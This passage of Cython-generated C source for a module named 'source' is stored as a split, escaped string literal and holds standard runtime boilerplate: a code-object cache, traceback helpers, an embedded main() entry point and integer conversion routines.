unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {\\n        PyCodeObject* tmp = entries[pos].code_object;\\n        entries[pos].code_object = code_object;\\n        Py_DECREF(tmp);\\n        return;\\n    }\\n    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {\\n        int new_max = __pyx_code_ca\"\"che.max_count + 64;\\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(\\n            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));\\n        if (unlikely(!entries)) {\\n            return;\\n        }\\n        __pyx_code_cache.entries = entries;\\n        __pyx_code_cache.max_count = new_max;\\n    }\\n    for (i=__pyx_code_cache.count; i>pos; i--) {\\n        entries[i] = entries[i-1];\\n    }\\n    entries[pos].code_line = code_line;\\n    entries[pos].code_object = code_object;\\n    __pyx_code_cache.count++;\\n    Py_INCREF(code_object);\\n}\\n\\n/* AddTraceback */\\n#include \\\"compile.h\\\"\\n#include \\\"frameobject.h\\\"\\n#include \\\"traceback.h\\\"\\n#if PY_VERSION_HEX >= 0x030b00a6\\n  #ifndef Py_BUILD_CORE\\n    #define Py_BUILD_CORE 1\\n  #endif\\n  #include \\\"internal/pycore_frame.h\\\"\\n#endif\\nstatic PyCodeObject* __Pyx_CreateCodeObjectForTraceback(\\n            const char *funcname, int c_line,\\n            int py_line, const char *filename) {\\n    PyCodeObject *py_code = NULL;""\\n    PyObject *py_funcname = NULL;\\n    #if PY_MAJOR_VERSION < 3\\n    PyObject *py_srcfile = NULL;\\n    py_srcfile = PyString_FromString(filename);\\n    if (!py_srcfile) goto bad;\\n    #endif\\n    if (c_line) {\\n        #if PY_MAJOR_VERSION < 3\\n        py_funcname = PyString_FromFormat( \\\"%s (%s:%d)\\\", funcname, __pyx_cfilenm, c_line);\\n        if (!py_funcname) goto bad;\\n        #else\\n        py_funcname = PyUnicode_FromFormat( \\\"%s (%s:%d)\\\", funcname, __pyx_cfilenm, c_line);\\n        if (!py_funcname) goto bad;\\n        funcname = PyUnicode_AsUTF8(py_funcname);\\n        if (!funcname) goto bad;\\n        #endif\\n    }\\n    else {\\n        #if PY_MAJOR_VERSION < 3\\n        py_funcname = PyString_FromString(funcname);\\n        if (!py_funcname) goto bad;\\n        #endif\\n    }\\n    #if PY_MAJOR_VERSION < 3\\n    py_code = __Pyx_PyCode_New(\\n        0,\\n        0,\\n        0,\\n        0,\\n        0,\\n        __pyx_empty_bytes, /*PyObject *code,*/\\n        __pyx_\"\"empty_tuple, /*PyObject *consts,*/\\n        __pyx_empty_tuple, /*PyObject *names,*/\\n        __pyx_empty_tuple, /*PyObject *varnames,*/\\n        __pyx_empty_tuple, /*PyObject *freevars,*/\\n        __pyx_empty_tuple, /*PyObject *cellvars,*/\\n        py_srcfile,   /*PyObject *filename,*/\\n        py_funcname,  /*PyObject *name,*/\\n        py_line,\\n        __pyx_empty_bytes  /*PyObject *lnotab*/\\n    );\\n    Py_DECREF(py_srcfile);\\n    #else\\n    py_code = PyCode_NewEmpty(filename, funcname, py_line);\\n    #endif\\n    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline\\n    return py_code;\\nbad:\\n    Py_XDECREF(py_funcname);\\n    #if PY_MAJOR_VERSION < 3\\n    Py_XDECREF(py_srcfile);\\n    #endif\\n    return NULL;\\n}\\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\\n                               int py_line, const char *filename) {\\n    PyCodeObject *py_code = 0;\\n    PyFrameObject *py_frame = 0;\\n    P""yThreadState *tstate = __Pyx_PyThreadState_Current;\\n    PyObject *ptype, *pvalue, *ptraceback;\\n    if (c_line) {\\n        c_line = __Pyx_CLineForTraceback(tstate, c_line);\\n    }\\n    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);\\n    if (!py_code) {\\n        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\\n        py_code = __Pyx_CreateCodeObjectForTraceback(\\n            funcname, c_line, py_line, filename);\\n        if (!py_code) {\\n            /* If the code object creation fails, then we should clear the\\n               fetched exception references and propagate the new exception */\\n            Py_XDECREF(ptype);\\n            Py_XDECREF(pvalue);\\n            Py_XDECREF(ptraceback);\\n            goto bad;\\n        }\\n        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\\n        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);\\n    }\\n    py_frame = PyFrame_New(\\n        tstate,            /*PyThreadState *tstate,*/\\n        py_code,           /*PyCodeObject *code,*/\"\"\\n        __pyx_d,    /*PyObject *globals,*/\\n        0                  /*PyObject *locals*/\\n    );\\n    if (!py_frame) goto bad;\\n    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);\\n    PyTraceBack_Here(py_frame);\\nbad:\\n    Py_XDECREF(py_code);\\n    Py_XDECREF(py_frame);\\n}\\n\\n/* MainFunction */\\n#ifdef __FreeBSD__\\n#include <floatingpoint.h>\\n#endif\\n#if PY_MAJOR_VERSION < 3\\nint main(int argc, char** argv) {\\n#elif defined(WIN32) || defined(MS_WINDOWS)\\nint wmain(int argc, wchar_t **argv) {\\n#else\\nstatic int __Pyx_main(int argc, wchar_t **argv) {\\n#endif\\n    /* 754 requires that FP exceptions run in \\\"no stop\\\" mode by default,\\n     * and until C vendors implement C99's ways to control FP exceptions,\\n     * Python requires non-stop mode.  Alas, some platforms enable FP\\n     * exceptions by default.  Here we disable them.\\n     */\\n#ifdef __FreeBSD__\\n    fp_except_t m;""\\n    m = fpgetmask();\\n    fpsetmask(m & ~FP_X_OFL);\\n#endif\\n    if (argc && argv)\\n        Py_SetProgramName(argv[0]);\\n    Py_Initialize();\\n    if (argc && argv)\\n        PySys_SetArgv(argc, argv);\\n    {\\n      PyObject* m = NULL;\\n      __pyx_module_is_main_source = 1;\\n      #if PY_MAJOR_VERSION < 3\\n          initsource();\\n      #elif CYTHON_PEP489_MULTI_PHASE_INIT\\n          m = PyInit_source();\\n          if (!PyModule_Check(m)) {\\n              PyModuleDef *mdef = (PyModuleDef *) m;\\n              PyObject *modname = PyUnicode_FromString(\\\"__main__\\\");\\n              m = NULL;\\n              if (modname) {\\n                  m = PyModule_NewObject(modname);\\n                  Py_DECREF(modname);\\n                  if (m) PyModule_ExecDef(m, mdef);\\n              }\\n          }\\n      #else\\n          m = PyInit_source();\\n      #endif\\n      if (PyErr_Occurred()) {\\n          PyErr_Print();\\n          #if PY_MAJOR_VERSION < 3\\n          if (Py_FlushLine()) PyErr_Clear();\\n          #endif\\n          return 1;\\n      }\\n      Py_XDECREF(m);\\n    }\\n#if PY_VERSION_HEX < 0x0306000\"\"0\\n    Py_Finalize();\\n#else\\n    if (Py_FinalizeEx() < 0)\\n        return 2;\\n#endif\\n    return 0;\\n}\\n#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)\\n#include <locale.h>\\nstatic wchar_t*\\n__Pyx_char2wchar(char* arg)\\n{\\n    wchar_t *res;\\n#ifdef HAVE_BROKEN_MBSTOWCS\\n    /* Some platforms have a broken implementation of\\n     * mbstowcs which does not count the characters that\\n     * would result from conversion.  Use an upper bound.\\n     */\\n    size_t argsize = strlen(arg);\\n#else\\n    size_t argsize = mbstowcs(NULL, arg, 0);\\n#endif\\n    size_t count;\\n    unsigned char *in;\\n    wchar_t *out;\\n#ifdef HAVE_MBRTOWC\\n    mbstate_t mbs;\\n#endif\\n    if (argsize != (size_t)-1) {\\n        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));\\n        if (!res)\\n            goto o""om;\\n        count = mbstowcs(res, arg, argsize+1);\\n        if (count != (size_t)-1) {\\n            wchar_t *tmp;\\n            /* Only use the result if it contains no\\n               surrogate characters. */\\n            for (tmp = res; *tmp != 0 &&\\n                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)\\n                ;\\n            if (*tmp == 0)\\n                return res;\\n        }\\n        free(res);\\n    }\\n#ifdef HAVE_MBRTOWC\\n    /* Overallocate; as multi-byte characters are in the argument, the\\n       actual output could use less memory. */\\n    argsize = strlen(arg) + 1;\\n    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));\\n    if (!res) goto oom;\\n    in = (unsigned char*)arg;\\n    out = res;\\n    memset(&mbs, 0, sizeof mbs);\\n    while (argsize) {\\n        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);\\n        if (converted == 0)\\n            break;\\n        if (converted == (size_t)-2) {\\n            /* Incomplete character. This should never happen,\\n               since we provide everything that we have -\\n               unless there is a bug in the C library, or I\\n               misunderstood how mbrtowc works. */\\n     \"\"       fprintf(stderr, \\\"unexpected mbrtowc result -2\\\\\\\\n\\\");\\n            free(res);\\n            return NULL;\\n        }\\n        if (converted == (size_t)-1) {\\n            /* Conversion error. Escape as UTF-8b, and start over\\n               in the initial shift state. */\\n            *out++ = 0xdc00 + *in++;\\n            argsize--;\\n            memset(&mbs, 0, sizeof mbs);\\n            continue;\\n        }\\n        if (*out >= 0xd800 && *out <= 0xdfff) {\\n            /* Surrogate character.  Escape the original\\n               byte sequence with surrogateescape. */\\n            argsize -= converted;\\n            while (converted--)\\n                *out++ = 0xdc00 + *in++;\\n            continue;\\n        }\\n        in += converted;""\\n        argsize -= converted;\\n        out++;\\n    }\\n#else\\n    /* Cannot use C locale for escaping; manually escape as if charset\\n       is ASCII (i.e. escape all bytes > 128. This will still roundtrip\\n       correctly in the locale's charset, which must be an ASCII superset. */\\n    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));\\n    if (!res) goto oom;\\n    in = (unsigned char*)arg;\\n    out = res;\\n    while(*in)\\n        if(*in < 128)\\n            *out++ = *in++;\\n        else\\n            *out++ = 0xdc00 + *in++;\\n    *out = 0;\\n#endif\\n    return res;\\noom:\\n    fprintf(stderr, \\\"out of memory\\\\\\\\n\\\");\\n    return NULL;\\n}\\nint\\nmain(int argc, char **argv)\\n{\\n    if (!argc) {\\n        return __Pyx_main(0, NULL);\\n    }\\n    else {\\n        int i, res;\\n        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\\n        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\\n        char *oldloc = strdup(setlocale(LC_ALL, NULL));\\n        if (!argv_copy || !argv_copy2 || !oldloc) {\\n            fprintf(stderr, \\\"out of memory\\\\\\\\n\\\");\\n            free(argv_copy);\\n            free(argv_copy2);\\n            free(oldloc);\\n            return 1;\\n        }\\n        res = 0;\\n        setlo\"\"cale(LC_ALL, \\\"\\\");\\n        for (i = 0; i < argc; i++) {\\n            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);\\n            if (!argv_copy[i]) res = 1;\\n        }\\n        setlocale(LC_ALL, oldloc);\\n        free(oldloc);\\n        if (res == 0)\\n            res = __Pyx_main(argc, argv_copy);\\n        for (i = 0; i < argc; i++) {\\n#if PY_VERSION_HEX < 0x03050000\\n            free(argv_copy2[i]);\\n#else\\n            PyMem_RawFree(argv_copy2[i]);\\n#endif\\n        }\\n        free(argv_copy);\\n        free(argv_copy2);\\n        return res;\\n    }\\n}\\n#endif\\n\\n/* CIntToPy */\\n    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(lon""g value) {\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\n#pragma GCC diagnostic push\\n#pragma GCC diagnostic ignored \\\"-Wconversion\\\"\\n#endif\\n    const long neg_one = (long) -1, const_zero = (long) 0;\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\n#pragma GCC diagnostic pop\\n#endif\\n    const int is_unsigned = neg_one > const_zero;\\n    if (is_unsigned) {\\n        if (sizeof(long) < sizeof(long)) {\\n            return PyInt_FromLong((long) value);\\n        } else if (sizeof(long) <= sizeof(unsigned long)) {\\n            return PyLong_FromUnsignedLong((unsigned long) value);\\n#ifdef HAVE_LONG_LONG\\n        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\\n            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);\\n#endif\\n        }\\n    } else {\\n        if (sizeof(long) <= sizeof(long)) {\\n            return PyInt_FromLong((long) value);\\n#ifdef HAVE_LONG_LONG\\n        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {\\n            return PyLong_FromLongLong((PY_LONG_LONG) value);\\n#endif\\n        }\\n    }\\n    {\\n        int one = 1; int little = (int)*(unsigned char *)&one;\\n        unsigned char *bytes = (unsigned char *)&value;\\n        return _PyLong_FromByteArray(bytes, sizeof(long),\\n                                     little, !is_unsigned);\\n    }\\n}\\n\\n/* CIntFromPyVerify */\\n    #define __PYX_VERIFY_RETUR\"\"N_INT(target_type, func_type, func_value)\\\\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)\\n#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\\\\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)\\n#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\\\\\\n    {\\\\\\n        func_type value = func_value;\\\\\\n        if (sizeof(target_type) < sizeof(func_type)) {\\\\\\n            if (unlikely(value != (func_type) (target_type) value)) {\\\\\\n                func_type zero = 0;\\\\\\n                if (exc && un""likely(value == (func_type)-1 && PyErr_Occurred()))\\\\\\n                    return (target_type) -1;\\\\\\n                if (is_unsigned && unlikely(value < zero))\\\\\\n                    goto raise_neg_overflow;\\\\\\n                else\\\\\\n                    goto raise_overflow;\\\\\\n            }\\\\\\n        }\\\\\\n        return (target_type) value;\\\\\\n    }\\n\\n/* CIntFromPy */\\n    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\n#pragma GCC diagnostic push\\n#pragma GCC diagnostic ignored \\\"-Wconversion\\\"\\n#endif\\n    const long neg_one = (long) -1, const_zero = (long) 0;\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\n#pragma GCC diagnostic pop\\n#endif\\n    const int is_unsigned = neg_one > const_zero;\\n#if PY_MAJOR_VERSION < 3\\n    if (likely(PyInt_Check(x))) {\\n        if (sizeof(long) < sizeof(long)) {\\n            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))\\n        } else {\\n            long val = PyInt_AS_LONG(x);\\n            if (is_unsigned && unlikely(val < 0)) {\\n                goto raise_neg_overflow;\\n            }\\n            return (long) val;\\n        }\\n    } else\\n#endif\\n    if (likely(PyLong_Check(x))) {\\n        if (is_unsigned) {\\n#if CYTHON_USE_PYLONG_INTERNALS\\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\\n            switch (Py_SIZE(x)) {\\n                case  0: return (long) 0;\\n                case  1: __PY\"\"X_VERIFY_RETURN_INT(long, digit, digits[0])\\n                case 2:\\n                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {\\n                            return (long) (((((long)digits[1]) << PyLong_""SHIFT) | (long)digits[0]));\\n                        }\\n                    }\\n                    break;\\n                case 3:\\n                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {\\n                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\\n                        }\\n                    }\\n                    break;\\n                case 4:\\n                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {\\n                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\\n                        }\\n                    }\\n         \"\"           break;\\n            }\\n#endif\\n#if CYTHON_COMPILING_IN_CPYTHON\\n            if (unlikely(Py_SIZE(x) < 0)) {\\n                goto raise_neg_overflow;\\n            }\\n#else\\n            {\\n                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\\n                if (unlikely(result < 0))\\n                    return (long) -1;\\n                if (unlikely(result == 1))\\n                    goto raise_neg_overflow;\\n            }\\n#endif""\\n            if (sizeof(long) <= sizeof(unsigned long)) {\\n                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))\\n#ifdef HAVE_LONG_LONG\\n            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\\n                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\\n#endif\\n            }\\n        } else {\\n#if CYTHON_USE_PYLONG_INTERNALS\\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\\n            switch (Py_SIZE(x)) {\\n                case  0: return (long) 0;\\n                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))\\n                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])\\n                case -2:\\n                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\\n                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                case 2:\\n                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\\n                            __PYX\"\"_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\\n                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                case -3:\\n                    if (8"" * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\\n                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                case 3:\\n                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\\n                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                case -4:\\n                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << \"\"PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\\n                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));""\\n                        }\\n                    }\\n                    break;\\n                case 4:\\n                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\\n                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\n                        }\\n                    }\\n                    break;\\n            }\\n#endif\\n            if (sizeof(long) <= sizeof(long)) {\\n                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))\\n#ifdef HAVE_LONG_LONG\\n            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {\\n                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))\\n#endif\\n            }\\n        }\\n        {\\n#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)\\n            PyErr_SetString(PyExc_RuntimeError,\\n                            \\\"_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers\\\");\\n#else\\n            long val;\\n            PyObject *v = __Pyx_PyNumber_IntOrLong(x);\\n #if PY_MAJOR_VERSION < 3\\n            if (likely(v) && !PyLong_Check(v)) {\\n                PyO\"\"bject *tmp = v;\\n                v = PyNumber_Long(tmp);\\n                Py_DECREF(tmp);\\n            }\\n #endif\\n            if (likely(v)) {\\n                int one = 1; int is_little = (int)*(unsigned char *)&one;\\n                unsigned char *bytes = (unsigned char *)&val;\\n                int ret = _PyLong_AsByteArray((PyLongObject *)v,\\n     ""                                         bytes, sizeof(val),\\n                                              is_little, !is_unsigned);\\n                Py_DECREF(v);\\n                if (likely(!ret))\\n                    return val;\\n            }\\n#endif\\n            return (long) -1;\\n        }\\n    } else {\\n        long val;\\n        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);\\n        if (!tmp) return (long) -1;\\n        val = __Pyx_PyInt_As_long(tmp);\\n        Py_DECREF(tmp);\\n        return val;\\n    }\\nraise_overflow:\\n    PyErr_SetString(PyExc_OverflowError,\\n        \\\"value too large to convert to long\\\");\\n    return (long) -1;\\nraise_neg_overflow:\\n    PyErr_SetString(PyExc_OverflowError,\\n        \\\"can't convert negative value to long\\\");\\n    return (long) -1;\\n}\\n\\n/* CIntFromPy */\\n    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\n#pragma GCC diagnostic push\\n#pragma GCC diagnostic ignored \\\"-Wconversion\\\"\\n#endif\\n    const int neg_one = (int) -1, const_zero = (int) 0;\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\n#pragma GCC diagnostic pop\\n#endif\\n    const int is_unsigned = neg_one > const_zero;\\n#if PY_MAJOR_VERSION < 3\\n    if (likely(PyInt_Check(x))) {\\n        if (sizeof(int) < sizeof(long)) {\\n            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))\\n        } else {\\n            long val = PyInt_AS_LONG(x);\\n            if (is_unsigned && unlikely(val < 0)) {\\n                goto raise_neg_overflow;\\n            }\\n            return (int) val;\\n        }\\n    } else\\n#endif\\n    if (likely(PyLong_Check(x))) {\\n        if (is_unsigned) {\\n#if CYTHON\"\"_USE_PYLONG_INTERNALS\\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\\n            switch (Py_SIZE(x)) {\\n                case  0: return (int) 0;\\n                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])\\n                case 2:\\n                ""    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {\\n                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\\n                        }\\n                    }\\n                    break;\\n                case 3:\\n                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {\\n                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\\n                        }\\n                    }\\n                    break;\\n                case 4:\\n                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {\\n                            return (int) (((((((((int)digits\"\"[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\\n                        }\\n                    }\\n                    break;\\n            }\\n#endif\\n#if CYTHON_COMPILING_IN_CPYTHON""\\n            if (unlikely(Py_SIZE(x) < 0)) {\\n                goto raise_neg_overflow;\\n            }\\n#else\\n            {\\n                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\\n                if (unlikely(result < 0))\\n                    return (int) -1;\\n                if (unlikely(result == 1))\\n                    goto raise_neg_overflow;\\n            }\\n#endif\\n            if (sizeof(int) <= sizeof(unsigned long)) {\\n                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))\\n#ifdef HAVE_LONG_LONG\\n            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {\\n                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\\n#endif\\n            }\\n        } else {\\n#if CYTHON_USE_PYLONG_INTERNALS\\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\\n            switch (Py_SIZE(x)) {\\n                case  0: return (int) 0;\\n                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))\\n                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])\\n                case -2:\\n                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\\n                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                case 2:\\n                 \"\"   if (8 * sizeof(int) > 1 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((un""signed long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\\n                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                case -3:\\n                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\\n                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                case 3:\\n                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\\n                            return (int) 